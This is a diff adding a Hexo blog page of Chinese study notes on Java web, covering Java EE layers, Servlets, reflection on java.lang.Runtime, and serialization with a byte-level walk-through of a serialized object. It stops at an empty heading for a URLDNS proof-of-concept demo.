@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>java_web学习之路 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Java web学习记录Java EE 分层模型Java EE 核心 Java数据库链接 JDBC：用来规范客户端程序如何访问数据库的应用程序接口 Java命名和目录接口 JNDI：一个API，提供了一个目录系统，并将服务名称与对象关联起来，从而使开发人员在开发过程中可以用名称来访问对象 企业级JavaBean EJB：是一个用来构建企业级应用的在服务端可被管理的组件 远程方法调用 RMI：拥护开">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java_web学习之路">
+<meta property="og:url" content="http://example.com/2022/03/07/java_web/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Java web学习记录Java EE 分层模型Java EE 核心 Java数据库链接 JDBC：用来规范客户端程序如何访问数据库的应用程序接口 Java命名和目录接口 JNDI：一个API，提供了一个目录系统，并将服务名称与对象关联起来，从而使开发人员在开发过程中可以用名称来访问对象 企业级JavaBean EJB：是一个用来构建企业级应用的在服务端可被管理的组件 远程方法调用 RMI：拥护开">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.runoob.com/wp-content/uploads/2014/07/servlet-arch.jpg">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/EFbAclWq6DfjUvC.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/v1jPgZmeyILRHo9.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/5PioE2WFacpLnZ8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/QblcMgRmxd3JE9S.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/jXWGatHFhBx4i9y.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/hqtAv9LgE7lseFD.png">
+<meta property="og:image" content="https://www.runoob.com/wp-content/uploads/2020/07/WV9wXLl.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/06/D1vh6FBE3uCpMX2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/06/YShNqQI5AdPZJvO.png">
+<meta property="article:published_time" content="2022-03-06T16:31:34.000Z">
+<meta property="article:modified_time" content="2022-03-06T16:33:47.087Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.runoob.com/wp-content/uploads/2014/07/servlet-arch.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-java_web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/07/java_web/" class="article-date">
+  <time class="dt-published" datetime="2022-03-06T16:31:34.000Z" itemprop="datePublished">2022-03-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      java_web学习之路
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Java-web学习记录"><a href="#Java-web学习记录" class="headerlink" title="Java web学习记录"></a>Java web学习记录</h1><h2 id="Java-EE-分层模型"><a href="#Java-EE-分层模型" class="headerlink" title="Java EE 分层模型"></a>Java EE 分层模型</h2><h3 id="Java-EE-核心"><a href="#Java-EE-核心" class="headerlink" title="Java EE 核心"></a>Java EE 核心</h3><ul>
+<li><strong>Java数据库链接 JDBC</strong>：用来规范客户端程序如何访问数据库的应用程序接口</li>
+<li><strong>Java命名和目录接口 JNDI</strong>：一个API，提供了一个目录系统，并将服务名称与对象关联起来，从而使开发人员在开发过程中可以用名称来访问对象</li>
+<li><strong>企业级JavaBean EJB</strong>：是一个用来构建企业级应用的在服务端可被管理的组件</li>
+<li><strong>远程方法调用 RMI</strong>：拥护开发分布式应用程序的API</li>
+<li><strong>Servlet</strong>：Java编写的服务端程序，狭义的Servlet是指Java语言实现的一个接口，广义的Servlet指任何实现该Servlet接口的类。主要功能在于交互式地浏览和修改数据，生成动态web内容</li>
+<li><strong>JSP</strong>：一种动态网页技术标准</li>
+<li><strong>XML</strong>：被设计用于传输和储存数据的语言</li>
+<li><strong>Java消息服务 JMS</strong>：一个Java平台中关于面向消息中间件（MOM）的API，用于在两个应用程序之间或分布式系统中发送消息，进行异步通信</li>
+</ul>
+<h3 id="Java-EE-分层模型-1"><a href="#Java-EE-分层模型-1" class="headerlink" title="Java EE 分层模型"></a>Java EE 分层模型</h3><ul>
+<li>Domain Object层（领域对象层）：由一系列普通、传统的Java对象（POJO）组成，这些对象是该系统的Domain Object，通常包括各自所需实现的业务逻辑方法</li>
+<li>DAO层（数据访问对象层）：由一系列DAO组件组成，这些DAO实现了对数据库的各种操作</li>
+<li>Service层：由一系列业务逻辑对象组成，这些业务逻辑对象实现了系统所需要的业务逻辑方法</li>
+<li>Controller层：由一系列控制器组成，这些控制器用于拦截用户请求，并调用业务逻辑组件的业务逻辑方法去处理用户请求，然后根据处理结果向不同的View组件转发</li>
+<li>View层：由一系列的页面及视图组件组成，负责收集用户请求，并显示处理后的结果</li>
+</ul>
+<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p>Servlet是在Java web容器中运行的小程序，用户使用Servlet来处理一些较为复杂的服务端业务逻辑，通常用作HTTP servlet的简写。</p>
+<img src="https://www.runoob.com/wp-content/uploads/2014/07/servlet-arch.jpg" alt="Servlet 架构"  />
+
+<h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><h3 id="反射的定义"><a href="#反射的定义" class="headerlink" title="反射的定义"></a>反射的定义</h3><p>一般情况下，我们使用某个类时必定知道它是什么类，是用来做什么的。于是我们直接对这个类进行实例化，之后使用这个类对象进行操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HelloWorld</span> <span class="variable">helloworld</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloWorld</span>(); <span class="comment">//直接初始化，&quot;正射&quot;</span></span><br><span class="line">helloworld.sayHello(<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
+
+<p>上面这样子进行类对象的初始化，我们可以理解为”正”。而反射则是一开始并不知道我要初始化的类对象是什么，自然也无法使用new关键字来创建对象了。这时候，我们使用JDK提供的反射API进行反射调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">class</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.reflect.ReflectTest&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> class.getMethod(<span class="string">&quot;sayhello&quot;</span>, string.class);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> class.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line">method.invoke(object, <span class="string">&quot;Bob&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；<code>对于任意一个对象，都能够调用它的任意一个方法和属性</code>；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p>
+<p>要想解剖一个类,必须先要获取到该类的字节码文件对象。而解剖使用的就是Class类中的方法.所以先要获取到每一个字节码文件对应的Class类型的对象.</p>
+<p>反射就是把java类中的各种成分映射成一个个的Java对象</p>
+<p>例如：一个类有：成员变量、方法、构造方法、包等等信息，利用反射技术可以对一个类进行解剖，把各个组成部分映射成一个个对象。（其实：一个类中这些成员方法、构造方法、在加入类中都有一个类来描述） 如图是类的正常加载过程：反射的原理在于class对象。熟悉一下加载的时候：Class对象的由来是将class文件读入内存，并为之创建一个Class对象。</p>
+<h3 id="获取Runtime类Class对象代码片段"><a href="#获取Runtime类Class对象代码片段" class="headerlink" title="获取Runtime类Class对象代码片段"></a>获取Runtime类Class对象代码片段</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span>     <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass1</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass2</span> <span class="operator">=</span> java.lang.Runtime.class;</span><br><span class="line"><span class="type">Class</span>  <span class="variable">runtimeClass3</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(className);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通过以上任意一种方式就可以获取<strong>java.lang.Runtime</strong>类的<strong>Class</strong>对象了。</p>
+<p>反射调用内部类的时候需要使用**$<strong>来代替</strong>.<strong>,如</strong>com.reflect.ReflectTest<strong>类有一个叫做</strong>Hello<strong>的内部类，那么调用的时候就应该将类名写成：</strong>com.reflect.ReflectTest$Hello**。</p>
+</blockquote>
+<h3 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h3><h4 id="使用forName-方法"><a href="#使用forName-方法" class="headerlink" title="使用forName()方法"></a>使用forName()方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetClassName</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">name</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/03/03/EFbAclWq6DfjUvC.png" alt="image-20220211091828362"></p>
+<p><img src="https://s2.loli.net/2022/03/03/v1jPgZmeyILRHo9.png" alt="image-20220211091837203"></p>
+<h4 id="直接获取"><a href="#直接获取" class="headerlink" title="直接获取"></a>直接获取</h4><p>任何数据类型都具有静态的属性，因此可使用.class直接获取其对应的Class对象。需要用到类中的静态成员</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetClassName</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; name = Runtime.class;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用getClass-方法"><a href="#使用getClass-方法" class="headerlink" title="使用getClass()方法"></a>使用getClass()方法</h4><p>可以通过Object类中的getClass()方法来获取字节码对象。需要指明具体的类，然后创建对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetClassName</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        Class&lt;?&gt; name = rt.getClass();</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用getSystemClassLoader-loadClass-方法"><a href="#使用getSystemClassLoader-loadClass-方法" class="headerlink" title="使用getSystemClassLoader().loadClass()方法"></a>使用getSystemClassLoader().loadClass()方法</h4><p>getSystemClassLoader().loadClass()与forName()方法类似，只要有类名称即可。区别在于forName()的静态方法JVM会装载类，并且执行static()中的代码；而getSystemClassLoader().loadClass不会执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetClassName</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; name = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取类方法"><a href="#获取类方法" class="headerlink" title="获取类方法"></a>获取类方法</h3><h4 id="getDeclaredMethods"><a href="#getDeclaredMethods" class="headerlink" title="getDeclaredMethods()"></a>getDeclaredMethods()</h4><p>getDeclaredMethods()方法返回类或接口声明的所有方法，包括public protected private和默认方法，但不包括继承的方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetClassName</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; name = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Method[] declareMethods = name.getDeclaredMethods();</span><br><span class="line">        System.out.println(<span class="string">&quot;通过getDeclaredMethods()方法获取方法&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Method m:declareMethods)</span><br><span class="line">            System.out.println(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下图</p>
+<p><img src="https://s2.loli.net/2022/03/03/5PioE2WFacpLnZ8.png" alt="image-20220211175124663"></p>
+<p>关于代码的一些细节（没系统学过Java 流下了眼泪</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method[] declareMethods = name.getDeclaredMethods();</span><br></pre></td></tr></table></figure>
+
+<p>在Java中，声明数组的格式是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dataType[] arrayRefVar;<span class="comment">//首选</span></span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">dataType arrayRefVar[];  <span class="comment">// 效果相同，但不是首选方法</span></span><br></pre></td></tr></table></figure>
+
+<p>所以在这行代码中，Method是数据类型，也就是我们需要的方法数组</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Method m:declareMethods)</span><br><span class="line">	System.out.println(m);</span><br></pre></td></tr></table></figure>
+
+<p>这是Java遍历数组常见的一种方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">double</span> element: myList)</span><br><span class="line">	System.out.println(element);</span><br></pre></td></tr></table></figure>
+
+<h4 id="getMethods"><a href="#getMethods" class="headerlink" title="getMethods()"></a>getMethods()</h4><p>getMethods()返回某个类中的所有public方法，包括其继承类的public方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetClassName</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        Class&lt;?&gt; name = rt.getClass();</span><br><span class="line">        Method[] methods = name.getMethods();</span><br><span class="line">        System.out.println(<span class="string">&quot;getMethods()获取的方法:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Method m:methods)</span><br><span class="line">            System.out.println(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/03/03/QblcMgRmxd3JE9S.png" alt="image-20220211180432623"></p>
+<p>上图中包含了继承类的方法</p>
+<h2 id="Java序列化和反序列化"><a href="#Java序列化和反序列化" class="headerlink" title="Java序列化和反序列化"></a>Java序列化和反序列化</h2><h3 id="序列化与反序列化的定义"><a href="#序列化与反序列化的定义" class="headerlink" title="序列化与反序列化的定义"></a>序列化与反序列化的定义</h3><ul>
+<li>Java序列化是将Java对象转换为字节序列的行为</li>
+<li>Java反序列化即序列化的反向操作，将字节序列恢复为对象的过程</li>
+</ul>
+<h3 id="序列化与反序列化的具体代码实现"><a href="#序列化与反序列化的具体代码实现" class="headerlink" title="序列化与反序列化的具体代码实现"></a>序列化与反序列化的具体代码实现</h3><ul>
+<li>在ObjectOutputStream 中使用 writeObject 方法，将对象以二进制格式进行写入</li>
+<li>在ObjectInputStream 中使用 readObject 方法，从输入流中读取二进制流，转换成对象</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Customer</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> serialVersionUID;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"><span class="keyword">private</span> String sex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(String sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.text.MessageFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        SerializeCustomer();</span><br><span class="line">        <span class="type">Customer</span> <span class="variable">customer</span> <span class="operator">=</span> DeserializeCustomer();</span><br><span class="line">        System.out.println(MessageFormat.format(<span class="string">&quot;age:&#123;0&#125;, name:&#123;1&#125;, sex:&#123;2&#125;&quot;</span>,customer.getAge(),customer.getName(),customer.getSex()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SerializeCustomer</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Customer</span> <span class="variable">customer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Customer</span>();</span><br><span class="line">        customer.setAge(<span class="number">24</span>);</span><br><span class="line">        customer.setName(<span class="string">&quot;m1yuu&quot;</span>);</span><br><span class="line">        customer.setSex(<span class="string">&quot;male&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;C:\\Users\\Administrator\\customer&quot;</span>)));</span><br><span class="line">        oos.writeObject(customer);</span><br><span class="line">        oos.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> Customer <span class="title function_">DeserializeCustomer</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;C:\\Users\\Administrator\\customer&quot;</span>)));</span><br><span class="line">        <span class="type">Customer</span> <span class="variable">customer</span> <span class="operator">=</span> (Customer) ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> customer;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/03/03/jXWGatHFhBx4i9y.png" alt="image-20220225104740882"></p>
+<ul>
+<li><code>0xaced</code>:魔术头</li>
+<li><code>0x0005</code>:版本号</li>
+<li><code>0x73</code>，对象类型标识 <em>（<code>0x7n</code>基本上都定义了类型标识符常量，但也要看出现的位置，毕竟它们都在可见字符的范围，详见<code>java.io.ObjectStreamConstants</code>）</em></li>
+<li><code>0x72</code>，类描述符标识</li>
+<li><code>0x0008...</code>，类名字符串长度和值 <em>（Java序列化中的UTF8格式标准）</em></li>
+<li><code>0xac7ba91da37b53e5</code>，序列版本唯一标识 <em>（<code>serialVersionUID</code>，简称SUID）</em></li>
+<li><code>0x02</code>，对象的序列化属性标志位，如是否是Block Data模式、自定义<code>writeObject()</code>，<code>Serializable</code>、<code>Externalizable</code>或<code>Enum</code>类型等</li>
+<li><code>0x0003</code>，类的字段个数</li>
+<li><code>0x49</code>，整数类型签名的第一个字节，同理，之后的<code>0x4c</code>为字符串类型签名的第一个字节 <em>（类型签名表示与JVM规范中的定义相同）</em></li>
+<li><code>0x0003...</code>，字段名字符串长度和值，非原始数据类型的字段还会在后面加上数据类型标识、完整类型签名长度和值，如之后的<code>0x4c0003...</code></li>
+<li><code>0x78</code> Block Data结束标识</li>
+<li><code>0x70</code> 父类描述符标识，此处为<code>null</code></li>
+</ul>
+<h3 id="SerialVersionUID"><a href="#SerialVersionUID" class="headerlink" title="SerialVersionUID"></a>SerialVersionUID</h3><p>serialVersionUID适用于java序列化机制。简单来说，JAVA序列化的机制是通过 判断类的serialVersionUID来验证的版本一致的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID于本地相应实体类的serialVersionUID进行比较。如果相同说明是一致的，可以进行反序列化，否则会出现反序列化版本一致的异常，即是InvalidCastException。</p>
+<p><strong>具体序列化的过程：</strong></p>
+<p>序列化操作时会把系统当前类的serialVersionUID写入到序列化文件中，当反序列化时系统会自动检测文件中的serialVersionUID，判断它是否与当前类中的serialVersionUID一致。如果一致说明序列化文件的版本与当前类的版本是一样的，可以反序列化成功，否则就失败；</p>
+<p><strong>serialVersionUID有两种显示的生成方式：</strong>一是默认的1L，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privatestaticfinallong serialVersionUID = 1L;    </span><br></pre></td></tr></table></figure>
+
+<p>二是根据包名，类名，继承关系，非私有的方法和属性，以及参数，返回值等诸多因子计算得出的，极度复杂生成的一个64位的哈希字段。基本上计算出来的这个值是唯一的。比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privatestaticfinallong serialVersionUID = xxxxL;</span><br></pre></td></tr></table></figure>
+
+<h3 id="演示（URLDNS）"><a href="#演示（URLDNS）" class="headerlink" title="演示（URLDNS）"></a>演示（URLDNS）</h3><p>一般来说，</p>
+<p>poc测试代码：URLDNS.java</p>
